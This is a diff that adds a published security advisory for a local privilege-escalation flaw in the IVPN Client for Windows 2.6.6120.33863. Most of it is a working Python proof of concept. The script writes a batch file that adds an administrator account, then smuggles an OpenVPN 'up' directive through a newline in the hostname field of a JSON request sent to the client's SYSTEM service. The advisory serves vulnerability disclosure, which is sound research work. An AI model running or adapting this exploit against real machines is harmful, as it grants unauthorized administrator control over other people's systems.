@@ -1,0 +1,48 @@
+# Exploit IVPN Client for Windows 2.6.6120.33863 Privilege Escalation
+# Date: 06.02.2017
+# Software Link: https://www.ivpn.net/
+# Exploit Author: Kacper Szurek
+# Contact: https://twitter.com/KacperSzurek
+# Website: https://security.szurek.pl/
+# Category: local
+ 
+1. Description
+
+It is possible to run `openvpn` as `SYSTEM` with custom openvpn.conf.
+
+Using `--up cmd` we can execute any command.
+
+https://security.szurek.pl/ivpn-client-for-windows-26612033863-privilege-escalation.html
+
+2. Proof of Concept
+
+import socket
+
+print "IVPN Client for Windows 2.6.6120.33863 Privilege Escalation"
+print "by Kacper Szurek"
+print "http://security.szurek.pl/"
+print "https://twitter.com/KacperSzurek"
+
+hostname = "is.gw.ivpn.net 2049"
+username = "your_username"
+password = "your_password"
+
+open(r'c:\\1\\test.bat', 'w').write('net user hacked /add\nnet localgroup administrators hacked /add')
+
+port = int(open(r"c:\Program Files\IVPN Client\etc\port.txt").read())
+
+a = r'{"$type":"IVPN.OpenVPNServer, IVPN.Core","id":"id","region":"region","country":"country","city":"city","hostnames":{"$type":"System.Collections.Generic.List`1[[System.String, mscorlib]], mscorlib","$values":["'+hostname+r'\r\nup c:\\\\\\\\1\\\\\\\\test.bat\r\nverb"]},"ports":{"$type":"System.Collections.Generic.List`1[[IVPN.OpenVPNServerPort, IVPN.Core]], mscorlib","$values":[{"$type":"IVPN.OpenVPNServerPort, IVPN.Core","protocol":1,"port":2000}]}}'
+
+b = r'{"$type":"IVPN.IVPNConnectRequest, IVPN.Core","entryServer":'+a+',"exitServer":'+a+',"username":"'+username+'","password":"'+password+'","portProtocol":{"$type":"IVPN.OpenVPNServerPort, IVPN.Core","protocol":1,"port":2000},"proxyType":"sth","proxyAddress":"proxyAddress","proxyPort":100,"proxyUsername":"proxyUsername","proxyPassword":"proxyPassword"}'
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("127.0.0.1", port))
+s.send(b)
+
+print "OK"
+
+3. Solution
+
+Update to version 2.6.2
+
+https://www.ivpn.net/setup/windows-changelog.html
